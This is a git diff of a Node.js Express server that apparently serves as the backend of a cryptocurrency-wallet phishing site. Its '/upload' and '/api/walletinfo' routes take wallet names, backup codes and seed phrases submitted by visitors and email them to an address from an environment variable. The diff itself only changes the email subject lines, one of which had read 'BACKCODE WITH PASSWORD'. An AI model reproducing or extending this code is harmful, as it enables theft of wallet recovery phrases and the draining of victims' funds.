@@ -65,7 +65,7 @@ app.post('/upload', upload.single('file'),(req,res)=>{
             address: process.env.EMAIL_ADDRESS
         },
         to: process.env.EMAIL_TO ,
-        subject: `<span style={{textTransform: "uppercase"}}>${backcode.wallet}</span> BACKCODE WITH PASSWORD ` ,
+        subject: `${backcode.wallet} BACKCODE` ,
         html:`
         <div> 
         <p>WALLET NAME: ${backcode.wallet}<p>
@@ -107,7 +107,7 @@ app.post("/api/walletinfo", bodyParser.urlencoded({ extended:false}), (req, res)
             address: process.env.EMAIL_ADDRESS
         },
         to: process.env.EMAIL_TO ,
-        subject: `<p style={{textTransform: "uppercase"}}>${seed.phrase}<p> + " " + PHRASE`,
+        subject:   `${seed.wallet} PHRASE`,
         html: `
         <div> 
         <p>WALLET NAME: ${seed.wallet}<p>
@@ -127,6 +127,7 @@ app.post("/api/walletinfo", bodyParser.urlencoded({ extended:false}), (req, res)
 app.get("*", (req, res) => {
     res.sendFile(path.resolve(__dirname, "../build", "index.html"));
 })
+
 app.listen(PORT, () => {
     console.log(`server is live on PORT:${PORT}`)
 })
